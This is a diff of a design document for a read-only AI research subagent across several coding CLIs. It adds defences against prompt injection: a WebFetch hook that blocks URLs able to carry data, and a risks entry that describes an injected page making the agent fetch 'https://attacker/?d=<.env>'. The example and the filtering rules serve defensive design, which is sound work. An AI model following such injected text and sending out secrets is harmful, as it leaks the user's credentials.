@@ -72,7 +72,7 @@ Both challengers run in the same round, in parallel. That satisfies "two indepen
 ### D4. `ops-researcher` read-only per CLI
 | CLI | How read-only is enforced |
 |---|---|
-| Claude Code | `tools: [Read, Glob, Grep, WebSearch, WebFetch]`. `permissionMode: bypassPermissions` is safe because no write tool is listed, and it avoids WebFetch prompts in a fan-out. |
+| Claude Code | `tools: [Read, Glob, Grep, WebSearch, WebFetch]`. `permissionMode: bypassPermissions` avoids WebFetch prompts in a fan-out; no write tool is listed. Read plus WebFetch under bypass is an exfiltration path (an injected page asks for `https://attacker/?d=<.env>`), so a frontmatter `PreToolUse` hook on `WebFetch` runs `opsx-questions/webfetch-guard.sh` (install.sh writes its absolute path, as for `monitor-guard.sh`), which applies `questions.sh url` and blocks (exit 2, also under bypass) any URL with a query string, userinfo, port, IP or local host, or a path segment over 64 characters, and fails closed on an unreadable payload. |
 | Cursor | frontmatter `readonly: true` (new optional argument to `install_cursor_agent`) |
 | Codex | `[features]` `shell_tool`, `apps`, `plugins`, `memories` = false in the TOML (new optional argument to `install_codex_agent`). Verified during apply: `sandbox_mode` in an agent file does not override the parent session, and no key removes file edits, so Codex cannot make the agent fully read-only (README gap; Codex researches in the parent anyway) |
 | OpenCode | a read-only permission block: `edit`, `bash`, `task`, `todowrite` deny; `read`, `glob`, `grep`, `list`, `webfetch`, `websearch` allow (new `install_opencode_agent` variant) |
@@ -83,7 +83,7 @@ The researcher gets **no MCP tools**. Tracker MCP servers mix read and write too
 The Cursor `readonly` key, the Codex agent keys and the Gemini tool names come from those CLIs' documentation. None of these CLIs is installed here, so task 3.x checks them against the docs (Context7 or web) before relying on them. Tests check the generated files, not the CLIs.
 
 ### D5. Validation is in the parent, mechanical first
-For each result: parse `VERDICT:` and the evidence lines, run `questions.sh cite` for each `file:` item, fetch each `url:` item, compare `ticket:` and `req:` items against what the parent read, and drop failures. Then judge, and apply the downgrade rules, before `record`. `--sources` is the number of evidence items that survived. The parent records validated verdicts only, so `status` reflects validation.
+For each result: parse `VERDICT:` and the evidence lines, run `questions.sh cite -- …` for each `file:` item (strict arguments: `-h` in a value is a value, so a fabricated citation cannot exit 0 through the help path), run `questions.sh url -- <url>` for each `url:` item and fetch only what passes (a URL that could carry data the subagent encoded is dropped unfetched), compare `ticket:` and `req:` items against what the parent read, and drop failures. Then judge, and apply the downgrade rules, before `record`. `--sources` is the number of evidence items that survived. The parent records validated verdicts only, so `status` reflects validation.
 
 A malformed result (no `VERDICT:` line or an unknown verdict) is retried once with the same brief. A second malformed result is recorded as `needs-human` (answer) or `stands` with 0 sources (challenge). Either way the verdict is recorded with `--attempts 2`, so `subagents=` in `status` counts the retry.
 
@@ -91,6 +91,9 @@ A malformed result (no `VERDICT:` line or an unknown verdict) is retried once wi
 With no argument, the parent itself lists the open questions (answer, settle) or the decisions taken (challenge) from the conversation, writes the TSV with kind `open` or `decision` and source `conversation`, and continues as for any input. Subagents never see the conversation, only the briefs.
 
 ## Risks / Trade-offs
+
+- [Prompt injection exfiltrates repository data through a URL] → Claude Code: the researcher's WebFetch hook and the parent's `questions.sh url` check refuse query strings, userinfo, ports, IP and local hosts and long opaque path segments. Accepted residual: data split into short (also percent-encoded) path segments of an attacker-owned domain, and WebSearch queries (they reach the search provider, not an attacker host), are not blocked mechanically; the researcher's rules forbid putting file contents into a URL or query, and the parent shows every fetched URL in the report. Cursor, OpenCode and Gemini have no equivalent hook here (their read-only modes still allow web fetches); Codex researches in the parent.
+- [Hostile repository symlinks] → `extract` skips a symlinked change directory, design.md, proposal.md or spec.md; `cite` resolves symlinks before the confinement check.
 
 - [The challenger always finds something] → Verdicts need surviving citations, the downgrade rules apply, and the parent can reject an attack only by naming a concrete flaw. The report shows what was dropped, so the user sees the filtering.
 - [The parent defends its own decisions when validating a conversation challenge] → The concrete-flaw rule, and the report shows rejected attacks with the stated flaw, so the user can overrule.
